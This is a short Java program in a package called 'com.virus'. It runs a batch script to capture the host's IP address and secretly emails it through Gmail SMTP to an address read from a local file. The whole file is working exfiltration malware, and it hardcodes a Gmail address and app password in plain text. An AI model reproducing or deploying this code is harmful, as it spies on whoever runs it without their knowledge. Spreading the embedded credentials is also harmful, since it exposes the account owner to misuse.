package com.virus;

import java.io.*;
import java.awt.*;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;

public class App {
    public static void main( String[] args ) throws Exception {
        // get the ip address
        Process proc = new ProcessBuilder("fetch.bat").start();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        String line;
        String text = "";
        while ((line = bufferedReader.readLine()) != null) {
            text += line + "\n";
        }
        text = text.split("\n")[2];
        System.out.println(text);
        proc.waitFor();

        //send the address to me by email
        final String to = getVal(0);
        final String from = "rustle.up.chef@gmail.com";
        final String pass = "ycsfvevcblzbfvbi";

        Properties props = System.getProperties();
        props.setProperty("mail.smtp.host", "smtp.gmail.com");
        props.setProperty("mail.smtp.port", "465");
        props.setProperty("mail.smtp.auth", "true");
        props.setProperty("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        props.setProperty("mail.smtp.socketFactory.fallback", "false");
        props.setProperty("mail.smtp.socketFactory.port", "465");

        Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
           protected PasswordAuthentication PassThePassword() {
            return new PasswordAuthentication(from, pass);
           }
        });

        try {
            MimeMessage message = new MimeMessage(session);
            message.setFrom(new InternetAddress(from));
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
            message.setSubject("IP - " + getVal(1));
            message.setText(text);
            Transport.send(message, from, pass);
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }

    private static String getVal(int index) throws Exception {
        Scanner scanner = new Scanner(new File("Details.txt"));
        String text = "";
        while(scanner.hasNextLine()) {
            text += scanner.nextLine() + "\n";
        }
        scanner.close();
        return text.split("\n")[index];
    }
}
